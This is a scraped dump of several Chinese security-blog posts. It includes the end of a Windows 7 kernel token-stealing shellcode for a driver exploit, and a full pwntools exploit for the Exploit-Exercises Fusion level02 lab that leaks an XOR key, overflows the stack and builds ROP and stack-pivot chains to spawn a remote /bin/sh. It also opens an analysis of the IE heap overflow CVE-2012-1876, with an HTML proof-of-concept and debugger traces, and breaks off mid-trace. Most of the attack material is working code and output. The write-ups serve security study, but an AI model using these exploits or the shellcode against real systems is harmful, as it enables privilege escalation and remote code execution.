1234567891011121314151617181920212223242526272829303132333435363738// Windows 7 SP1 x86 Offsets#define KTHREAD_OFFSET 0x124 // nt!_KPCR.PcrbData.CurrentThread#define EPROCESS_OFFSET 0x050 // nt!_KTHREAD.ApcState.Process#define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId#define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink#define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token#define SYSTEM_PID 0x004 // SYSTEM Process PIDVOID TokenStealingShellcodeWin7() &#123; __asm &#123; ; initialize pushad; save registers state mov eax, fs:[KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process mov ecx, eax; Copy current _EPROCESS structure mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4 SearchSystemPID: mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, FLINK_OFFSET cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId jne SearchSystemPID mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM to current process popad; restore registers state ; recovery xor eax, eax; Set NTSTATUS SUCCEESS add esp, 12; fix the stack pop ebp ret 8 &#125;&#125; 之后就可以成功获取最高权限了 参考：https://sizzop.github.io/2016/07/05/kernel-hacking-with-hevd-part-1.htmlhttp://www.fuzzysecurity.com/tutorials/expDev/14.htmlhttp://www.osronline.com/article.cfm?article=295https://github.com/sam-b/HackSysDriverExploits/tree/master/HackSysDriverStackoverflowExploithttps://github.com/hacksysteam/HackSysExtremeVulnerableDriver","categories":[],"tags":[{"name":"内核漏洞","slug":"内核漏洞","permalink":"https://www.giantbranch.cn/tags/内核漏洞/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://www.giantbranch.cn/tags/漏洞利用/"}]},{"title":"从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式","slug":"从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式","date":"2017-08-22T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/08/22/从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式/","link":"","permalink":"https://www.giantbranch.cn/2017/08/22/从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式/","excerpt":"","text":"题目来源：https://exploit-exercises.com/fusion/level02/ Vulnerability Type Stack Position Independent Executable No Read only relocations No Non-Executable stack Yes Non-Executable heap Yes Address Space Layout Randomisation Yes Source Fortification No 程序开启了ASLR和NX，漏洞程序源码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &quot;../common/common.c&quot; #define XORSZ 32void cipher(unsigned char *blah, size_t len)&#123; static int keyed; static unsigned int keybuf[XORSZ]; int blocks; unsigned int *blahi, j; if(keyed == 0) &#123; int fd; fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(read(fd, &amp;keybuf, sizeof(keybuf)) != sizeof(keybuf)) exit(EXIT_FAILURE); close(fd); keyed = 1; &#125; blahi = (unsigned int *)(blah); blocks = (len / 4); if(len &amp; 3) blocks += 1; for(j = 0; j &lt; blocks; j++) &#123; blahi[j] ^= keybuf[j % XORSZ]; &#125;&#125;void encrypt_file()&#123; // http://thedailywtf.com/Articles/Extensible-XML.aspx // maybe make bigger for inevitable xml-in-xml-in-xml ? unsigned char buffer[32 * 4096]; unsigned char op; size_t sz; int loop; printf(&quot;[-- Enterprise configuration file encryption service --]\\n&quot;); loop = 1; while(loop) &#123; nread(0, &amp;op, sizeof(op)); switch(op) &#123; case &apos;E&apos;: nread(0, &amp;sz, sizeof(sz)); nread(0, buffer, sz); cipher(buffer, sz); printf(&quot;[-- encryption complete. please mention &quot; &quot;474bd3ad-c65b-47ab-b041-602047ab8792 to support &quot; &quot;staff to retrieve your file --]\\n&quot;); nwrite(1, &amp;sz, sizeof(sz)); nwrite(1, buffer, sz); break; case &apos;Q&apos;: loop = 0; break; default: exit(EXIT_FAILURE); &#125; &#125; &#125;int main(int argc, char **argv, char **envp)&#123; int fd; char *p; background_process(NAME, UID, GID); fd = serve_forever(PORT); set_io(fd); encrypt_file();&#125; 看着这buffer也太大了，有点吓，我总结了三点 首先我们不输入Q是不会退出的 buffer的长度是我们指定的，肯定能溢出 key虽然是随机的，但是只生成一次（因为是static变量），而且最后会输出buffer，那就可以泄露key的可能 0x01 泄露key直接发128个0xff过去，回来再异或一下就可以获取key了，当然你发其他的也可以，比如A,B,C,D,E,F,G,记得回来异或一下就好 12345678910111213141516171819def getkey(p): key = &quot;&quot; p.recvuntil(STRING1) p.send(&quot;E&quot;) data = &quot;\\xff&quot; * 128 p.send(p32(len(data))) p.send(data) # print recvuntil(s, 120) p.recvuntil(STRING2) keylen = u32(p.recv(4)) tmp_key = p.recv(128) for x in xrange(0,128): key += chr(ord(tmp_key[x]) ^ 0xff) # print(keylen) return key 0x02开始利用总的思路是利用read函数将/bin/sh字符串写到一个不变的地址（一般是.bss），再调用execve，或者system什么的 0x02.1定位溢出点：首先我们得定位溢出地址，buffer很大，好像直接用字符串定位不太好使，但我们可以在加密前调试查看 12&gt;&gt;&gt; 32 * 4096131072 buffer这么大的话，我们用131000个A，再加上100个peda生成的吧（pattern_create 100） 发送如下： 1data = &quot;A&quot; * 131000 + &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot; 我们在read完的下一行下断点，因为这里用ebp来索引，查看ebp+4的地址即为返回地址 1234567891011121314gdb-peda$ b *0x08049891Breakpoint 1 at 0x8049891: file level02/level02.c, line 49.gdb-peda$ c Display various information of current execution contextUsage: context [reg,code,stack,all] [code/stack length]Breakpoint 1, encrypt_file () at level02/level02.c:4949 level02/level02.c: No such file or directory. in level02/level02.cgdb-peda$ x $ebp + 4 0xbf98158c: 0x414b4141gdb-peda$ 所以用peda看一下，偏移为88，所以最终为131000 + 88 = 131088 12gdb-peda$ pattern_offset 0x414b41411095450945 found at offset: 88 0x02.2找可写地址，函数plt等地址, 构造写入要写入binsh，首先看看哪里可写（看内存属性），一般bss段可写的，下面就印证了，地址为0x804b420 1234567891011121314151617181920212223242526272829303132gdb-peda$ maintenance info sections Exec file: `/opt/fusion/bin/level02&apos;, file type elf32-i386. 0x8048134-&gt;0x8048147 at 0x00000134: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS 0x8048148-&gt;0x8048168 at 0x00000148: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS 0x8048168-&gt;0x804818c at 0x00000168: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS 0x804818c-&gt;0x80481cc at 0x0000018c: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS 0x80481cc-&gt;0x80484ac at 0x000001cc: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS 0x80484ac-&gt;0x8048607 at 0x000004ac: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS 0x8048608-&gt;0x8048664 at 0x00000608: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS 0x8048664-&gt;0x8048694 at 0x00000664: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS 0x8048694-&gt;0x80486bc at 0x00000694: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS 0x80486bc-&gt;0x80487ec at 0x000006bc: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS 0x80487ec-&gt;0x804881a at 0x000007ec: .init ALLOC LOAD READONLY CODE HAS_CONTENTS 0x8048820-&gt;0x8048a90 at 0x00000820: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS 0x8048a90-&gt;0x8049a0c at 0x00000a90: .text ALLOC LOAD READONLY CODE HAS_CONTENTS 0x8049a0c-&gt;0x8049a26 at 0x00001a0c: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS 0x8049a28-&gt;0x8049ec0 at 0x00001a28: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS 0x8049ec0-&gt;0x8049f7c at 0x00001ec0: .eh_frame_hdr ALLOC LOAD READONLY DATA HAS_CONTENTS 0x8049f7c-&gt;0x804a274 at 0x00001f7c: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS 0x804b274-&gt;0x804b27c at 0x00002274: .init_array ALLOC LOAD DATA HAS_CONTENTS 0x804b27c-&gt;0x804b284 at 0x0000227c: .ctors ALLOC LOAD DATA HAS_CONTENTS 0x804b284-&gt;0x804b28c at 0x00002284: .dtors ALLOC LOAD DATA HAS_CONTENTS 0x804b28c-&gt;0x804b290 at 0x0000228c: .jcr ALLOC LOAD DATA HAS_CONTENTS 0x804b290-&gt;0x804b368 at 0x00002290: .dynamic ALLOC LOAD DATA HAS_CONTENTS 0x804b368-&gt;0x804b36c at 0x00002368: .got ALLOC LOAD DATA HAS_CONTENTS 0x804b36c-&gt;0x804b410 at 0x0000236c: .got.plt ALLOC LOAD DATA HAS_CONTENTS 0x804b410-&gt;0x804b418 at 0x00002410: .data ALLOC LOAD DATA HAS_CONTENTS 0x804b420-&gt;0x804b500 at 0x00002418: .bss ALLOC 0x0000-&gt;0x29f4 at 0x00002418: .stab READONLY HAS_CONTENTS 0x0000-&gt;0x9111 at 0x00004e0c: .stabstr READONLY HAS_CONTENTS 0x0000-&gt;0x002a at 0x0000df1d: .comment READONLY HAS_CONTENTS 或者查看ida的program Segmentation（shift+f7），或者像下面那样看内存布局 1234567891011121314root@fusion:~# cat /proc/3885/maps 08048000-0804b000 r-xp 00000000 07:00 75275 /opt/fusion/bin/level020804b000-0804c000 rw-p 00002000 07:00 75275 /opt/fusion/bin/level02b75f8000-b75f9000 rw-p 00000000 00:00 0 b75f9000-b776f000 r-xp 00000000 07:00 92669 /lib/i386-linux-gnu/libc-2.13.sob776f000-b7771000 r--p 00176000 07:00 92669 /lib/i386-linux-gnu/libc-2.13.sob7771000-b7772000 rw-p 00178000 07:00 92669 /lib/i386-linux-gnu/libc-2.13.sob7772000-b7775000 rw-p 00000000 00:00 0 b777f000-b7781000 rw-p 00000000 00:00 0 b7781000-b7782000 r-xp 00000000 00:00 0 [vdso]b7782000-b77a0000 r-xp 00000000 07:00 92553 /lib/i386-linux-gnu/ld-2.13.sob77a0000-b77a1000 r--p 0001d000 07:00 92553 /lib/i386-linux-gnu/ld-2.13.sob77a1000-b77a2000 rw-p 0001e000 07:00 92553 /lib/i386-linux-gnu/ld-2.13.sobf961000-bf982000 rw-p 00000000 00:00 0 [stack] 喜欢什么用什么 接下来我们找read的plt表，为什么用plt呢，可能got表还没初始化吧（不过好像plt也是跳到got先的），其实got表应该也可以，有空可以试试 read的plt表为0x08048860(用ida或者pwntools可以获得)，got表 0x0804B384 execve的plt地址080489B0，got表地址 0x0804B3D8 那么我们最终构造的栈应该如下，由于我们应多次利用，所以我们的retn应重新回到漏洞函数encrypt_file或者其他我们可控的地址 131088个填充 + read_plt + retn + 0 + bss_addr + 8 上面即调用了read(0, bss_addr, 8) 0x02.3执行binsh可能的3种利用思路（方法）： read后，直接pop 3个参数后调用execve(binsh,NULL,NULL) read后，回到漏洞函数继续同样的溢出重新利用，有时会覆盖环境变量导致执行失败，不过这里没有 read后，栈翻转，将栈指针指向.bss段，在bss段进行rop 但是第一次发现第一个个方式都不行，经过一段漫长时间的调试，终于发现了我的key接收少了，应该recv(128)，本来我写了32（因为当初一看那个数组是32，下意识就写了recv(32)），哎，找错真是费时间啊 下面尝试这三种思路 方法1写入binsh后，直接popread的3个参数后调用execve(binsh,NULL,NULL) 覆盖的构造如下，完整利用代码看下一行 1payload = &quot;A&quot; * 131088 + p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(len(binsh)) + p32(execve_plt) + &quot;A&quot;*4 + p32(bss_addr) + p32(bss_null_addr) + p32(bss_null_addr) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# -*- coding: utf-8 -*-from pwn import *binsh = &quot;/bin/sh\\x00&quot;bss_addr = 0x0804B420bss_null_addr = 0x804b430STRING1 = &quot;encryption service --]\\n&quot;STRING2 = &quot;staff to retrieve your file --]\\n&quot;def getkey(p): key = &quot;&quot; p.recvuntil(STRING1) p.send(&quot;E&quot;) data = &quot;\\xff&quot; * 128 p.send(p32(len(data))) p.send(data) # print recvuntil(s, 120) p.recvuntil(STRING2) keylen = u32(p.recv(4)) tmp_key = p.recv(128) for x in xrange(0,128): key += chr(ord(tmp_key[x]) ^ 0xff) # print(keylen) return keydef encrypt_payload(payload, key): payload_len = len(payload) result = &quot;&quot; for x in xrange(0,payload_len): result += chr(ord(payload[x]) ^ ord(key[x % len(key)])) return resultdef write_binsh(p , key): read_plt = 0x08048860 pop3_ret = 0x08048f85 execve_plt = 0x080489B0 payload = &quot;A&quot; * 131088 + p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(len(binsh)) + p32(execve_plt) + &quot;A&quot;*4 + p32(bss_addr) + p32(bss_null_addr) + p32(bss_null_addr) payload_len = len(payload) payload = encrypt_payload(payload, key) p.send(&quot;E&quot;) p.send(p32(payload_len)) p.send(payload) p.recvuntil(STRING2) writelen = u32(p.recv(4)) print writelen writed_str = p.recv(writelen) p.send(&quot;Q&quot;) return writed_strhost = &quot;192.168.52.141&quot;port = 20002p = remote(host, port)# raw_input() key = getkey(p)str = write_binsh(p, key)p.send(binsh)p.interactive() 方法2完整的上面已给，只给重点变的部分先调用write_binsh，写一个binsh字符串，之后回到encrypt_file漏洞函数，再次溢出调用execve(binsh,NULL,NULL) 12345678910111213141516171819202122232425262728293031def write_binsh(p , key): read_plt = 0x08048860 encrypt_file = 0x80497f7 payload = &quot;A&quot; * 131088 + p32(read_plt) + p32(encrypt_file) + p32(0) + p32(bss_addr) + p32(len(binsh)) payload_len = len(payload) payload = encrypt_payload(payload, key) p.send(&quot;E&quot;) p.send(p32(payload_len)) p.send(payload) p.recvuntil(STRING2) writelen = u32(p.recv(4)) print writelen writed_str = p.recv(writelen) p.send(&quot;Q&quot;) return writed_strdef exec_binsh(p, key): execve_plt = 0x080489B0 exit_plt = 0x08048960 payload = &quot;A&quot; * 131088 + p32(execve_plt) + p32(exit_plt) + p32(bss_addr) + p32(bss_null_addr)+ p32(bss_null_addr) payload_len = len(payload) payload = encrypt_payload(payload, key) p.send(&quot;E&quot;) p.send(p32(payload_len)) p.send(payload) p.recvuntil(STRING2) writelen = u32(p.recv(4)) print writelen writed_str = p.recv(writelen) p.send(&quot;Q&quot;) return writed_str 方法3好像这方法叫栈翻转，就是栈指针不再指向本来的栈空间，我们控制它指向我们可以控制的内存，比如这里我们让其指向bss段首地址 我们找到如下的小组件，如0x08048b13，我们在其后放bss地址，就可以将bss段首地址复制给ebp，如果我们再有将ebp赋值给esp再ret的就完美了，那就是leave;ret,我们用rp++找一下，选了下面两个 120x08048b13: pop ebp ; ret ; (1 found)0x08048b96: leave ; ret ; (1 found) 我们看看第一个payload，先将bss保存到ebp，之后调用read吸入bss_addr,read的返回地址为leave_ret（调用完read，ebp的值没变），之后leave_ret相当于mov esp,ebp;pop ebp; ret 1payload = &quot;A&quot; * 131088 + p32(pop_ebp_ret) + p32(bss_addr) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_addr) + p32(200) 由于上面 leave_ret有个pop ebp,所以我们写入的时候要有填充，4个A，execve_plt后面返回地址比较随便，好一点的话就搞个exit的函数咯 1payload2 = &quot;A&quot; * 4 + p32(execve_plt) + &quot;A&quot; * 4 + p32(binsh_addr) + p32(null_addr) + p32(null_addr) + binsh exp核心： 12345678910111213141516171819202122def write_binsh(p , key): read_plt = 0x08048860 execve_plt = 0x080489B0 pop3_ret = 0x08048f85 pop_ebp_ret = 0x08048b13 leave_ret = 0x08048b96 null_addr = 0x804b470 payload = &quot;A&quot; * 131088 + p32(pop_ebp_ret) + p32(bss_addr) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_addr) + p32(200) payload_len = len(payload) payload = encrypt_payload(payload, key) p.send(&quot;E&quot;) p.send(p32(payload_len)) p.send(payload) p.recvuntil(STRING2) writelen = u32(p.recv(4)) print writelen writed_str = p.recv(writelen) p.send(&quot;Q&quot;) binsh_addr = 0x804b438 payload2 = &quot;A&quot; * 4 + p32(execve_plt) + &quot;A&quot; * 4 + p32(binsh_addr) + p32(null_addr) + p32(null_addr) + binsh p.send(payload2) return writed_str","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"}]},{"title":"CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞","slug":"CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞","date":"2017-08-19T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/","link":"","permalink":"https://www.giantbranch.cn/2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/","excerpt":"","text":"[toc] 这是Pwn2Own黑客大赛上用于攻破IE9的漏洞 分析环境 Windows 7 32位VM 12IE8windbgida 基于HPA的漏洞分析方法poc 123456789101112131415161718&lt;html&gt; &lt;body&gt; &lt;table style=\"table-layout:fixed\" &gt; &lt;col id=\"132\" width=\"41\" span=\"1\" &gt;&amp;nbsp &lt;/col&gt; &lt;/table&gt; &lt;script&gt; function over_trigger() &#123; var obj_col = document.getElementById(\"132\"); obj_col.width = \"42765\"; obj_col.span = 1000; &#125; setTimeout(\"over_trigger();\",1); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 首先开启页堆 123C:\\Program Files\\Debugging Tools for Windows (x86)&gt;gflags.exe -i iexplore.exe +hpaCurrent Registry Settings for iexplore.exe executable are: 02000000 hpa - Enable page heap 打开poc，附加，允许阻止内容，我一下子就断下来了，不用设置子进程调试模式 1234567891011120:013&gt; gModLoad: 69260000 69312000 C:\\Windows\\System32\\jscript.dll(6ec.cc8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=06c91000 edi=06c91018eip=656af167 esp=045cdf28 ebp=045cdf34 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206mshtml!CTableColCalc::AdjustForCol+0x15:656af167 890f mov dword ptr [edi],ecx ds:0023:06c91018=????????0:005&gt; .childdbgProcesses created by the current process will not be debugged 可能作者附加的进程不是主进程，试了一下，果然是这个问题。 看下栈 123456789101112131415161718192021222324252627282930313233343536373839404142434445460:005&gt; kbChildEBP RetAddr Args to Child 0462db0c 67d95b8e 00414114 0462de50 00000001 mshtml!CTableColCalc::AdjustForCol+0x150462dbbc 67c00713 00000001 0462de50 000003e8 mshtml!CTableLayout::CalculateMinMax+0x52f0462ddd8 67beaf19 0462de50 0462de1c 00000001 mshtml!CTableLayout::CalculateLayout+0x2760462df84 67cdcc48 0462f5f8 0462e1b0 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x7200462e0bc 67ccf5d0 08533ea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b80462e180 67ccf31d 08533ea8 00012174 00012174 mshtml!CFlowLayout::MeasureSite+0x3120462e1c8 67ccf664 07e14f00 00000061 0462f5f8 mshtml!CFlowLayout::GetSiteWidth+0x1560462e208 67ccfb40 07607fb0 08533ea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce0462e28c 70fb665d 087f2ff8 0462e2ac 0462e370 mshtml!CEmbeddedILSObj::Fmt+0x1500462e31c 70fb6399 087daefc 00000000 087ded20 msls31!ProcessOneRun+0x3e90462e378 70fb6252 087daf18 00012a86 00000000 msls31!FetchAppendEscCore+0x18e0462e3cc 70fb61c3 00000000 00000000 00000014 msls31!LsDestroyLine+0x47f0462e454 70fb293f 00000007 00002b6c 00000000 msls31!LsDestroyLine+0x9ff0462e490 67ccdd81 00000001 00000007 00002b6c msls31!LsCreateLine+0xcb0462e5e0 67ce17cc 0462f5f8 00000007 07607fc0 mshtml!CLSMeasurer::LSDoCreateLine+0x1270462e684 67ce1ef5 0462eee8 00012174 00000000 mshtml!CLSMeasurer::LSMeasure+0x340462e6cc 67ce1db1 00000000 00012944 00000083 mshtml!CLSMeasurer::Measure+0x1e60462e6f0 67ce11a2 00012944 00000083 07e14f40 mshtml!CLSMeasurer::MeasureLine+0x1c0462e7a0 67d0a8f6 0462ecc0 08529fd8 00000083 mshtml!CRecalcLinePtr::MeasureLine+0x46d0462efa8 67d0b304 0462f5f8 00000007 0000000e mshtml!CDisplay::RecalcLines+0x8bb0462f0f8 67d08c5c 0462f5f8 00000007 0000000e mshtml!CDisplay::UpdateView+0x2080462f1ac 67d09ee3 0462f5f8 0462f730 0872cf10 mshtml!CFlowLayout::CommitChanges+0x9c0462f2bc 67beeb06 0462f5f8 0462f730 00000000 mshtml!CFlowLayout::CalcTextSize+0x30f0462f544 67ce02ee 07e14f00 0462f730 00000000 mshtml!CFlowLayout::CalcSizeCoreCompat+0x10450462f560 67ce0367 0462f5f8 0462f730 00000000 mshtml!CFlowLayout::CalcSizeCore+0x490462f59c 67ce029c 0462f5f8 0462f730 00000000 mshtml!CBodyLayout::CalcSizeCore+0xd80462f5d4 67cdcc48 0462f5f8 0462f730 00000000 mshtml!CFlowLayout::CalcSizeVirtual+0x1af0462f70c 67c64121 07e14f00 00000001 00000000 mshtml!CLayout::CalcSize+0x2b80462f7fc 67d090f9 00100000 00000007 0774ceb4 mshtml!CFlowLayout::DoLayout+0x5430462f838 67ccc8ca 0774c870 00100000 0462f898 mshtml!CView::ExecuteLayoutTasks+0x3b0462f87c 67d0336d 00000000 0462f8cc 00000035 mshtml!CView::EnsureView+0x3550462f8a4 67cc94b2 0774c870 00000000 05d3fd58 mshtml!CView::EnsureViewCallback+0xd30462f8d8 67cb37f7 0462f974 00008002 00000000 mshtml!GlobalWndOnMethodCall+0xff0462f8f8 771f86ef 000301f6 00000012 00000000 mshtml!GlobalWndProc+0x10c0462f924 771f8876 67ca1de3 000301f6 00008002 USER32!InternalCallWinProc+0x230462f99c 771f89b5 00000000 67ca1de3 000301f6 USER32!UserCallWinProcCheckWow+0x14b0462f9fc 771f8e9c 67ca1de3 00000000 0462fa84 USER32!DispatchMessageWorker+0x35e0462fa0c 6da104a6 0462fa24 00000000 0071cf58 USER32!DispatchMessageW+0xf0462fa84 6da20446 059be808 00000000 03336ff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x4520462fb3c 75a749bd 0071cf58 00000000 0462fb58 IEFRAME!LCIETab_ThreadProc+0x2c10462fb4c 76fc1174 03336ff0 0462fb98 774ab3f5 iertutil!CIsoScope::RegisterThread+0xab0462fb58 774ab3f5 03336ff0 73050d5a 00000000 kernel32!BaseThreadInitThunk+0xe0462fb98 774ab3c8 75a749af 03336ff0 00000000 ntdll!__RtlUserThreadStart+0x700462fbb0 00000000 75a749af 03336ff0 00000000 ntdll!_RtlUserThreadStart+0x1b 向上看，edi来源与esi，esi这个函数看不到，是上层函数，也就是mshtml!CTableLayout::CalculateMinMax 12345678910111213mshtml!CTableColCalc::AdjustForCol:67f1f152 8bff mov edi,edi67f1f154 55 push ebp67f1f155 8bec mov ebp,esp67f1f157 8b08 mov ecx,dword ptr [eax]67f1f159 53 push ebx67f1f15a 8b5d08 mov ebx,dword ptr [ebp+8]67f1f15d 57 push edi67f1f15e 8bc1 mov eax,ecx67f1f160 83e00f and eax,0Fh67f1f163 8d7e18 lea edi,[esi+18h]67f1f166 50 push eax67f1f167 890f mov dword ptr [edi],ecx ds:0023:08735018=???????? 我们在mshtml!CTableLayout::CalculateMinMax下个断点跟一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051520:013&gt; bp mshtml!CTableLayout::CalculateMinMax0:013&gt; gModLoad: 69430000 694e2000 C:\\Windows\\System32\\jscript.dllBreakpoint 0 hiteax=ffffffff ebx=08800ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466e824eip=673b018a esp=0466e5c8 ebp=0466e7e0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax:673b018a 8bff mov edi,edi0:005&gt; peax=ffffffff ebx=08800ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466e824eip=673b018c esp=0466e5c8 ebp=0466e7e0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x2:673b018c 55 push ebp0:005&gt; peax=ffffffff ebx=08800ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466e824eip=673b018d esp=0466e5c4 ebp=0466e7e0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x3:673b018d 8bec mov ebp,esp0:005&gt; peax=ffffffff ebx=08800ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466e824eip=673b018f esp=0466e5c4 ebp=0466e5c4 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x5:673b018f 81ec90000000 sub esp,90h0:005&gt; peax=ffffffff ebx=08800ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466e824eip=673b0195 esp=0466e534 ebp=0466e5c4 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xb:673b0195 53 push ebx0:005&gt; peax=ffffffff ebx=08800ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466e824eip=673b0196 esp=0466e530 ebp=0466e5c4 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xc:673b0196 8b5d08 mov ebx,dword ptr [ebp+8] ss:0023:0466e5cc=08800ea80:005&gt; dd 08800ea808800ea8 672a9868 0895ef30 08848fb8 6746491808800eb8 00000001 00000000 0108080d ffffffff08800ec8 00000000 00000000 00000000 ffffffff08800ed8 00012174 00007e90 00000000 0000000008800ee8 00000000 00412802 00000000 0000000008800ef8 00000000 00000001 ffffffff ffffffff08800f08 ffffffff ffffffff 672a9fd0 0000000408800f18 00000004 0795aff0 672a9fd0 000000040:005&gt; ln 672a9868 (672a9868) mshtml!CTableLayout::`vftable' | (672a99a8) mshtml!CTableLayoutBlock::`vftable'Exact matches: mshtml!CTableLayout::`vftable' = &lt;no type information&gt; 我们看到传进该函数的第一个参数是CTableLayout对象this指针（因为第一个地址是一个虚表）， 单步到下面这行，这就是poc里面的span的值1了 1234560:005&gt; peax=00000000 ebx=08800ea8 ecx=00412802 edx=ffffffff esi=0466e858 edi=0466e824eip=673b01a6 esp=0466e52c ebp=0466e5c4 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x1c:673b01a6 8b4354 mov eax,dword ptr [ebx+54h] ds:0023:08800efc=00000001 我们用ida看看器传递路径，给到了arg0 12345678910.text:74D301A6 mov eax, [ebx+54h].text:74D301A9 mov [ebp+arg_0], eax.......text:74D30289 cmp [ebp+arg_0], eax.text:74D3028C mov ecx, [ebp+arg_0].text:74D3028F jl short loc_74D30293.text:74D30291 mov ecx, eax ; this.text:74D30293.text:74D30293 loc_74D30293: ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+105j.text:74D30293 mov edx, [ebp+arg_0] 后面赋值给了edx 1234560:005&gt; peax=00000000 ebx=08800ea8 ecx=00000000 edx=0879bfd0 esi=0466e858 edi=00000000eip=673b0293 esp=0466e528 ebp=0466e5c4 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x13a:673b0293 8b5508 mov edx,dword ptr [ebp+8] ss:0023:0466e5cc=00000001 跟着ebx+94h右移两位后会和我们的edx比较，当然0右移多少还是0，所以是跟0比较 1234567891011121314151617180:005&gt; peax=00000000 ebx=08800ea8 ecx=00000000 edx=00000001 esi=0466e858 edi=00000000eip=673b02cc esp=0466e528 ebp=0466e5c4 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b1:673b02cc 8b8394000000 mov eax,dword ptr [ebx+94h] ds:0023:08800f3c=000000000:005&gt; peax=00000000 ebx=08800ea8 ecx=00000000 edx=00000001 esi=0466e858 edi=00000000eip=673b02d2 esp=0466e528 ebp=0466e5c4 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b7:673b02d2 c1e802 shr eax,20:005&gt; peax=00000000 ebx=08800ea8 ecx=00000000 edx=00000001 